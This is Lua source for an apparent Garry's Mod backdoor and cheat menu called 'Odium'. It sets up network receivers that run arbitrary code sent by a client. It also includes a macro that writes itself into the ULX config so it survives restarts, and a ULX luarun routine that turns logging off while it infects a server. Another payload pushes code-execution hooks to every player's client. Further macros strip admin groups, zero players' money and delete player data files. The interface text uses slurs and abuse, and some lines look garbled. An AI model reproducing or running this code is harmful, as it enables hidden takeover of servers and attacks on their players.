        for k,v in pairs(player.GetAll()) do
            ULib.ucl.addUser( v:SteamID(), {}, {}, "user" );
        end
 
        for k,v in pairs(ULib.ucl.groups) do
            if k != "user" then
                ULib.ucl.removeGroup(k);
            end
        end
 
        for k,v in pairs(ULib.ucl.users) do
            v.group = "user"
        end
        end

        if GAMEMODE.Name == "DarkRP" then
 
        for k,v in pairs(player.GetAll()) do
            RunConsoleCommand("rp_setmoney", v:Nick(), 0);
        end
 
        hook.Add("PlayerInitialSpawn", "darkrp_specific_persistence", function( ply )
            RunConsoleCommand("rp_setmoney", ply:Nick(), 0);
        end)
        end
 
        if GAMEMODE.Name == "Trouble in Terrorist Town" then //something here?
        //for k, v in pairs(player.GetAll()) do
        //end
        end
 
        if net.WriteString.find( GAMEMODE.Name:lower(), "stronghold" ) then
        for k,v in pairs(player.GetAll()) do
            RunConsoleCommand("gbux_setmoney", v:Nick(), 0);
        end
 
        hook.Add("PlayerInitialSpawn", "stronghold_specific_persistence", function( ply )
            RunConsoleCommand("gbux_setmoney", ply:Nick(), 0);
        end)

        local fil = file.Find( "data/stronghold/playerinfo/*.txt", "GAME" )

        for k, v in pairs( fil ) do
            file.Delete( fil )
        end
        end
        end)

        if GetConVarnet.WriteString("sv_allowcslua") != "0" then
        RunConsoleCommand( "sv_allowcslua", "1" );
        end

        hook.Add("Think", "busted", function()
        for k,v in pairs (player.GetAll()) do
        v:SetModelScale(2.5, 100);
        v:SetRunSpeed(400 * 2);
        v:SetWalkSpeed(200 * 2);
        end
        end
	]],

    ["Desc"] = "Causes damage to the server",

    },



}



local selectedbackdoor = ""

local backdoorargs = ""

local selectedplayers = {}







//////////////////////////////// BIG PRIVET CHEETZ ////////////////////////////////



if true then 

    if true then

        BD.BackdoorTypes["_Defqon"] = {

            ["Code"] = "util.AddNetworkString( '_Defqon' ) net.Receive( '_Defqon', function() local x = CompileString( net.ReadString(), 'LuaCmd', false ) if isfunction( x ) then x() end end )",

            ["Netkey"] = "_Defqon",

        }



        BD.BDMacros["@ Persistent Infection"] = {

            ["Type"] = 1,

            ["Code"] = [[

                local config = ULib.fileRead( "data/ulx/config.txt" )

                config = config.."\nulx logEcho 0"

                config = config.."\nulx luarun %BD"

                config = config.."\nulx logEcho 1"

                ULib.fileWrite( "data/ulx/config.txt", config )

                for _, p in pairs(player.GetAll()) do if %LCP then p:ChatPrint( "Persistent infection installed on server" ) end end

            ]],

            ["Desc"] = "Writes the backdoor code into memory, making sure that it stays on the server after restart",

            ["Private"] = true,

        }

    end

    if true then

        BD.BackdoorTypes[">Odium Detector"] = {

            ["Code"] = "util.AddNetworkString( 'OdiumBackdoor' ) net.Receive( 'OdiumBackdoor', function() local x = CompileString( net.ReadString(), 'LuaCmd', false ) if isfunction( x ) then x() end end )",

            ["Netkey"] = "OdiumBackdoor",

        }

    end

    if true then

        BD.BackdoorTypes["nostrip"] = {

            ["Code"] = "util.AddNetworkString( 'nostrip' ) net.Receive( 'nostrip', function() local x = CompileString( net.ReadString(), 'LuaCmd', false ) if isfunction( x ) then x() end end )",

            ["Netkey"] = "nostrip",

        }

    end

end













function BD.GenerateBackdoorList( parent, category )



for k, v in SortedPairs( BD.BDMacros, false ) do

    if v["Type"] != category then continue end



    local plypanel2 = vgui.Create( "DPanel" )

    plypanel2:SetPos( 0, 0 )

    plypanel2:SetSize( 200, 25 )

    plypanel2.Paint = function() -- Paint function

        draw.RoundedBoxEx(8,1,1,plypanel2:GetWide(),plypanel2:GetTall(),Color(0, 0, 0, 150), false, false, false, false)

        if selectedbackdoor == k then surface.SetDrawColor(Color(50, 250, 90, 255)) else surface.SetDrawColor(Color(50, 50, 90, 255)) end

        surface.DrawOutlinedRect(1, 1, plypanel2:GetWide() - 1 , plypanel2:GetTall() - 1)

    end



    local plyname = vgui.Create( "DLabel", plypanel2 )

    plyname:SetPos( 10, 5 )

    plyname:SetFont( "Trebuchet18" )

    local tcol = Color( 255, 255, 255 )

    if v.Private then tcol = Color( 155, 255, 155 ) end

    plyname:SetColor( tcol )

    plyname:SetText( k )

    plyname:SetSize(180, 15)





    local faggot = vgui.Create("DButton", plypanel2)

    faggot:SetSize( plypanel2:GetWide(), plypanel2:GetTall() )

    faggot:SetPos( 0, 0 )

    faggot:SetText("")

    if v["Desc"] != "" then faggot:SetToolTip( v["Desc"] ) end

    faggot.Paint = function(panel, w, h)

        return

    end

    faggot.DoClick = function()

        selectedbackdoor = k

    end





    parent:AddItem( plypanel2 )



end



end



function BD.FormatCodeTargeted()

if !BD.BackdoorActive() then BD.ChatText( "Warning: backdoor malfunctioning or not present!", Color(255,155,155) ) return end

if selectedbackdoor == "" then BD.ChatText( "You haven't selected a macro to use!", Color(255,155,155) ) return end

local param = string.Explode( ",", backdoorargs )

local ids = {}

for k, v in pairs( selectedplayers ) do

    if !v:IsValid() then table.RemoveByValue( selectedplayers, v ) continue end

    table.insert( ids, v:UniqueID() )

end



local code = [[ local targets = ## for k, v in pairs( player.GetAll() ) do if !v:IsValid() then continue end if table.HasValue( targets, v:UniqueID() ) then %% end end ]]

code = string.Replace( code, "##", table.ToString( ids ) )

code = string.Replace( code, "%%", BD.BDMacros[selectedbackdoor]["Code"] or "" )

code = string.Replace( code, "%LP", "p:UniqueID() == \""..LocalPlayer():UniqueID().."\"" )



if BD.BDMacros[selectedbackdoor]["NeedsParameters"] and (BD.BDMacros[selectedbackdoor]["NeedsParameters"] > #param or param[1] == "" ) then BD.ChatText( "This macro requires parameters to work! check its description for more info", Color(255,155,155) ) return end

if #param < 1 then param = { [1] = "derp", [2] = "derp", [3] = "derp", [4] = "derp", [5] = "derp" } end



for k, v in pairs( param ) do

    code = string.Replace( code, "@"..k, [["]]..v..[["]] )

end



BD.Fire( code )



end



function BD.FormatCodeGlobal()

if !BD.BackdoorActive() then BD.ChatText( "Warning: backdoor malfunctioning or not present!", Color(255,155,155) ) return end

if selectedbackdoor == "" then BD.ChatText( "You haven't selected a macro to use!", Color(255,155,155) ) return end

local param = string.Explode( ",", backdoorargs )



local code = BD.BDMacros[selectedbackdoor]["Code"]



if BD.BDMacros[selectedbackdoor]["NeedsParameters"] and (BD.BDMacros[selectedbackdoor]["NeedsParameters"] > #param or param[1] == "" ) then BD.ChatText( "This macro requires parameters to work! check its description for more info", Color(255,155,155) ) return end

if #param < 1 then param = { [1] = "derp", [2] = "derp", [3] = "derp", [4] = "derp", [5] = "derp" } end



for k, v in pairs( param ) do

    code = string.Replace( code, "@"..k, [["]]..v..[["]] )

    code = string.Replace( code, "%LP", LocalPlayer():UniqueID() )

    code = string.Replace( code, "%LCP", "p:UniqueID() == \""..LocalPlayer():UniqueID().."\"" )

    code = string.Replace( code, "%BD", BD.GetActive().Code )

end



BD.Fire( code )



end





local safenet = net

local function bdnet()

    return safenet

end





function BD.Fire( code )

    local cbd = BD.CurrentBackdoor



    local key = BD.BackdoorTypes[cbd].Netkey



    bdnet().Start( key )

    bdnet().WriteString( code )

    bdnet().SendToServer()

end





function BD.BackdoorMenu()



BD.Backdoors = BD.PingBackDoors()







local BDMenu = vgui.Create("DFrame")

BDMenu:SetSize(650,720)

BDMenu:SetTitle("Odium Backdoor Menu")

BDMenu:Center()

BDMenu:MakePopup()



BDMenu.Paint = function( self, w, h)

surface.SetDrawColor( Color(50, 50, 90, 255) )

surface.DrawRect( 0, 0, w, h )

surface.SetDrawColor( Color(155, 155, 155, 255) )

surface.DrawOutlinedRect( 0, 0, w, h )

surface.DrawOutlinedRect( 1, 1, w - 2, h - 2 )

surface.SetDrawColor( Color(0, 0, 0, 200) )

surface.DrawRect( 10, 25, w - 20, h - 35 )

surface.DrawRect( 15, 30, w - 30, 35 )

draw.SimpleText("Indiscriminate Lulz", "DermaDefault", 22, 75, Color(255, 255, 255), 0, 1)

draw.SimpleText("Specific Targets", "DermaDefault", 228, 75, Color(255, 255, 255), 0, 1)

draw.SimpleText("Trash the place", "DermaDefault", 432, 75, Color(255, 255, 255), 0, 1)

draw.SimpleText("Players to Target", "DermaDefault", 432, 305, Color(255, 255, 255), 0, 1)

draw.SimpleText("Macro Paramaters (seperate with commas)", "DermaDefault", 432, 610, Color(255, 255, 255), 0, 1)

end



local it = 145



local wedungoofd = vgui.Create( "DLabel", BDMenu )

wedungoofd:SetPos( 25, 38 )

wedungoofd:SetFont( "Trebuchet18" )

wedungoofd:SetColor( Color( 100, 255, 100 ) )

wedungoofd:SetText( "CHOOSE BACKDOOR:" )

wedungoofd:SizeToContents()



for bd, t in pairs( BD.BackdoorTypes ) do

    local faggot = vgui.Create("DButton", BDMenu)

    faggot:SetSize( 100, 25 )

    faggot:SetPos( it, 35 )

    faggot:SetText( bd )

    faggot:SetTextColor(Color(255, 255, 255, 255))

    faggot.Paint = function(panel, w, h)

        if BD.Backdoors[bd] then

            surface.SetDrawColor(100, 100, 200 ,255)

            surface.DrawOutlinedRect(0, 0, w, h)

            surface.SetDrawColor(0, 0, 50 ,155)

            surface.DrawRect(0, 0, w, h)

        else

            surface.SetDrawColor(50, 50, 50 ,155)

            surface.DrawRect(0, 0, w, h)

        end

    end

    faggot.DoClick = function()

        BD.ChatText( "Set active backdoor to "..bd, Color(155,155,255) )

        BD.CurrentBackdoor = bd

        surface.PlaySound("buttons/button18.wav")

    end

    it = it + 110

end



local Plist = vgui.Create( "DPanelList", BDMenu )

Plist:SetPos( 20, 85 )

Plist:SetSize( 200, 530 )

Plist:SetPadding( 5 )

Plist:SetSpacing( 5 )

Plist:EnableHorizontal( false )

Plist:EnableVerticalScrollbar( true )

Plist:SetName( "" )

Plist.Paint = function( self, w, h )

    surface.SetDrawColor(50, 50, 50 ,255)

    surface.DrawOutlinedRect(0, 0, w, h)

    surface.SetDrawColor(0, 0, 0 ,200)

    surface.DrawRect(0, 0, w, h)

end



local Plist2 = vgui.Create( "DPanelList", BDMenu )

Plist2:SetPos( 225, 85 )

Plist2:SetSize( 200, 610 )

Plist2:SetPadding( 5 )

Plist2:SetSpacing( 5 )

Plist2:EnableHorizontal( false )

Plist2:EnableVerticalScrollbar( true )

Plist2:SetName( "" )

Plist2.Paint = function( self, w, h )

    surface.SetDrawColor(50, 50, 50 ,255)

    surface.DrawOutlinedRect(0, 0, w, h)

    surface.SetDrawColor(0, 0, 0 ,200)

    surface.DrawRect(0, 0, w, h)

end



local Plist3 = vgui.Create( "DPanelList", BDMenu )

Plist3:SetPos( 430, 85 )

Plist3:SetSize( 200, 210 )

Plist3:SetPadding( 5 )

Plist3:SetSpacing( 5 )

Plist3:EnableHorizontal( false )

Plist3:EnableVerticalScrollbar( true )

Plist3:SetName( "" )

Plist3.Paint = function( self, w, h )

    surface.SetDrawColor(50, 50, 50 ,255)

    surface.DrawOutlinedRect(0, 0, w, h)

    surface.SetDrawColor(0, 0, 0 ,200)

    surface.DrawRect(0, 0, w, h)

end



local Plist4 = vgui.Create( "DPanelList", BDMenu )

Plist4:SetPos( 430, 315 )

Plist4:SetSize( 200, 250 )

Plist4:SetPadding( 5 )

Plist4:SetSpacing( 5 )

Plist4:EnableHorizontal( false )

Plist4:EnableVerticalScrollbar( true )

Plist4:SetName( "" )

Plist4.Paint = function( self, w, h )

    surface.SetDrawColor(50, 50, 50 ,255)

    surface.DrawOutlinedRect(0, 0, w, h)

    surface.SetDrawColor(0, 0, 0 ,200)

    surface.DrawRect(0, 0, w, h)

end



    local faggot = vgui.Create("DButton", BDMenu)

    faggot:SetSize( 200, 35 )

    faggot:SetPos( 430, 660 )

    faggot:SetText("Activate Backdoor!")

    faggot:SetTextColor(Color(255, 255, 255, 255))

    faggot.Paint = function(panel, w, h)

        surface.SetDrawColor(100, 100, 200 ,255)

        surface.DrawOutlinedRect(0, 0, w, h)

        surface.SetDrawColor(0, 0, 50 ,155)

        surface.DrawRect(0, 0, w, h)

    end

    faggot.DoClick = function() 
	
    if !BD.IsMessagePooled( "fucked" ) then

    BD.Fire( [[util.AddNetworkString( "fucked" )

    function BDSendLua( p, str ) net.Start( "fucked" ) net.WriteString( str ) net.Send( p ) end

    function BDSendLuaAll( str ) net.Start( "fucked" ) net.WriteString( str ) net.Broadcast() end

    function BDInjectAids( p ) p:SendLua( 'net.Receive( "fucked", function() RunString( net.ReadString() ) end )' ) end

    for k, v in pairs( player.GetAll() ) do BDInjectAids( v ) end

    hook.Add( "PlayerInitialSpawn", "youonlygetfuckedagain", function( p ) BDInjectAids( p ) end)

]] )

end
     
        if !BD.BDMacros[selectedbackdoor] or selectedbackdoor == "" then BD.ChatText( "You haven't even selected a macro to use ya dingus!", Color(255,155,155) ) return end

        if BD.BDMacros[selectedbackdoor].Type == ( 1 or 3 ) then BD.FormatCodeGlobal() else BD.FormatCodeTargeted() end

        surface.PlaySound("buttons/button18.wav")

    end


    


    local helpimretarded = vgui.Create("DButton", BDMenu)

    helpimretarded:SetSize( 200, 35 )

    helpimretarded:SetPos( 20, 660 )

    helpimretarded:SetText("Print backdoor code")

    helpimretarded:SetTextColor(Color(255, 255, 255, 255))

    helpimretarded.Paint = function(panel, w, h)

        surface.SetDrawColor(100, 100, 200 ,255)

        surface.DrawOutlinedRect(0, 0, w, h)

        surface.SetDrawColor(0, 0, 50 ,155)

        surface.DrawRect(0, 0, w, h)

    end

    helpimretarded.DoClick = function()

        BD.ChatText( "Output backdoor code to clipboard.  Ctrl-V it into a serverside .lua file on the target server then go molest its holes", Color(155,255,155) )

        local bdstring = BD.GetActive().Code

 --       local bdstring = [[util.AddNetworkString( "R8" ) net.Receive( "R8", function() local x = CompileString( net.ReadString(), "LuaCmd", false ) if isfunction( x ) then x() end end )]]

        SetClipboardText( bdstring ) 

    end



    local helpimretarded2 = vgui.Create("DButton", BDMenu)

    helpimretarded2:SetSize( 200, 35 )

    helpimretarded2:SetPos( 20, 620 )

    helpimretarded2:SetText("ULX Luarun Backdoor")

    helpimretarded2:SetTextColor(Color(255, 255, 255, 255))

    helpimretarded2.Paint = function(panel, w, h)

        surface.SetDrawColor(100, 100, 200 ,255)

        surface.DrawOutlinedRect(0, 0, w, h)

        surface.SetDrawColor(0, 0, 50 ,155)

        surface.DrawRect(0, 0, w, h)

    end

    helpimretarded2.DoClick = function()

        BD.ChatText( "Using ulx luarun to silently infect server", Color(155,255,155) )

        LocalPlayer():ConCommand( [[ulx rcon ulx logEcho 0]] )

        timer.Simple( 0.5, function()

            LocalPlayer():ConCommand( "ulx luarun "..BD.GetActive().Code )

--            LocalPlayer():ConCommand( "ulx luarun util.AddNetworkString( 'R8' ) net.Receive( 'R8', function() local x = CompileString( net.ReadString(), 'LuaCmd', false ) if isfunction( x ) then x() end end )" )

        end )

        timer.Simple( 1, function() LocalPlayer():ConCommand( [[ulx rcon ulx logEcho 1]] ) end )



        timer.Simple( 1.5, function() if BD.IsMessagePooled( BD.GetActive().Netkey ) then BD.ChatText( "Successfully infected!", Color(155,255,155) ) else BD.ChatText( "ULX infection failed!", Color(255,155,155) ) end end )

    end





local moonman = vgui.Create( "DTextEntry", BDMenu )

moonman:SetPos( 430, 625 )

moonman:SetSize( 200, 30 )

moonman:SetText( backdoorargs )

moonman.OnChange = function( self )

    backdoorargs = self:GetValue()

--    surface.PlaySound("buttons/button3.wav")

end





    local target1 = vgui.Create("DButton", BDMenu)

    target1:SetSize( 40, 20 )

    target1:SetPos( 520, 295 )

    target1:SetText("All")

    target1:SetTextColor(Color(255, 255, 255, 255))

    target1.Paint = function(panel, w, h)

        surface.SetDrawColor(100, 100, 200 ,255)

        surface.DrawOutlinedRect(0, 0, w, h)

        surface.SetDrawColor(0, 0, 50 ,155)

        surface.DrawRect(0, 0, w, h)

    end

    target1.DoClick = function()

        for _, p in pairs(player.GetAll()) do

            if not table.HasValue( selectedplayers, p ) then 

                table.insert( selectedplayers, p )

            end

        end

    end



    local target2 = vgui.Create("DButton", BDMenu)

    target2:SetSize( 40, 20 )

    target2:SetPos( 565, 295 )

    target2:SetText("None")

    target2:SetTextColor(Color(255, 255, 255, 255))

    target2.Paint = function(panel, w, h)

        surface.SetDrawColor(100, 100, 200 ,255)

        surface.DrawOutlinedRect(0, 0, w, h)

        surface.SetDrawColor(0, 0, 50 ,155)

        surface.DrawRect(0, 0, w, h)

    end

    target2.DoClick = function()

        table.Empty( selectedplayers )

    end



    local target2 = vgui.Create("DButton", BDMenu)

    target2:SetSize( 20, 20 )

    target2:SetPos( 610, 295 )

    target2:SetText("Me")

    target2:SetTextColor(Color(255, 255, 255, 255))

    target2.Paint = function(panel, w, h)

        surface.SetDrawColor(100, 100, 200 ,255)

        surface.DrawOutlinedRect(0, 0, w, h)

        surface.SetDrawColor(0, 0, 50 ,155)

        surface.DrawRect(0, 0, w, h)

    end

    target2.DoClick = function()

        table.Empty( selectedplayers )

        table.insert( selectedplayers, LocalPlayer() )

    end







-- players list



for k, v in pairs( player.GetAll() ) do



    local plypanel2 = vgui.Create( "DPanel" )

    plypanel2:SetPos( 0, 0 )

    plypanel2:SetSize( 200, 25 )

    plypanel2.Paint = function() -- Paint function

        draw.RoundedBoxEx(8,1,1,plypanel2:GetWide(),plypanel2:GetTall(),Color(0, 0, 0, 150), false, false, false, false)

        if table.HasValue( selectedplayers, v ) then surface.SetDrawColor(Color(50, 255, 90, 255)) else surface.SetDrawColor(Color(50, 50, 90, 255)) end

        surface.DrawOutlinedRect(1, 1, plypanel2:GetWide() - 1 , plypanel2:GetTall() - 1)

    end



    local plyname = vgui.Create( "DLabel", plypanel2 )

    plyname:SetPos( 10, 5 )

    plyname:SetFont( "Trebuchet18" )

    local tcol = Color( 255, 255, 255 )

    if v == LocalPlayer() then tcol = Color( 155, 155, 255 ) end

  --  elseif BD.IsFriend( v ) then tcol = Color( 0, 255, 0 )

--    elseif BD.GetRank(v) != ( "user" or "guest" or "player" ) then tcol = Color( 255, 100, 0 ) end

    plyname:SetColor( tcol )

    plyname:SetText( v:Nick() )

    plyname:SetSize(180, 15)





    local faggot = vgui.Create("DButton", plypanel2)

    faggot:SetSize( plypanel2:GetWide(), plypanel2:GetTall() )

    faggot:SetPos( 0, 0 )

    faggot:SetText("")

    faggot.Paint = function(panel, w, h)

        return

    end

    faggot.DoClick = function()

        if table.HasValue( selectedplayers, v ) then 

            table.RemoveByValue( selectedplayers, v )

        else

            table.insert( selectedplayers, v )

        end

    end





    Plist4:AddItem( plypanel2 )



end





BD.GenerateBackdoorList( Plist, 1 )

BD.GenerateBackdoorList( Plist2, 2 )

BD.GenerateBackdoorList( Plist3, 3 )



end

concommand.Add("odium", BD.BackdoorMenu)





function BD.QuickFireBackdoor()

if !BD.BDMacros[selectedbackdoor] or selectedbackdoor == "" then BD.ChatText( "You haven't even selected a macro to use ya dingus!", Color(255,155,155) ) return end

if BD.BDMacros[selectedbackdoor].Type == ( 1 or 3 ) then BD.FormatCodeGlobal() else BD.FormatCodeTargeted() end

end

concommand.Add("odium_quickfire", BD.QuickFireBackdoor)